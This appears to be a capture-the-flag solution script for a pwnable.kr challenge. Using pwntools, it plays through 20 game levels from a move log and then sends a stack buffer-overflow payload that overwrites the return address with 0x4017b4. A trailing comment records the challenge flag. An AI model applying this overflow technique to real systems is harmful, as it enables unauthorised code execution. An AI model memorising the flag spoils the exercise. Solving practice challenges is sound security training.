from pwn import *

context.log_level = 'info'

level = 1
sh = remote('pwnable.kr', 9014)


def move(char):
    global level
    sh.send(char)
    msg = sh.recvline()
    if 'clear' in msg:
        level += 1
    elif 'caught' in msg:
        log.info('Failed...')
        exit(0)


sh.recvuntil('PRESS ANY KEY TO START THE GAME\n')
sh.sendline('')
with open('log', 'r') as f:
    for line in f.readlines():
        log.info('Playing Level %d' % level)
        for c in line:
            sh.recvuntil('[]##\n################################\n')
            move(c)
            if level > 20:
                break

sh.recvuntil('record your name : ')
payload = 'A' * (48 + 8) + p64(0x4017b4)
sh.sendline(payload)
sh.interactive()

# i have a pocket protector prot3ctor pr0tect0r!
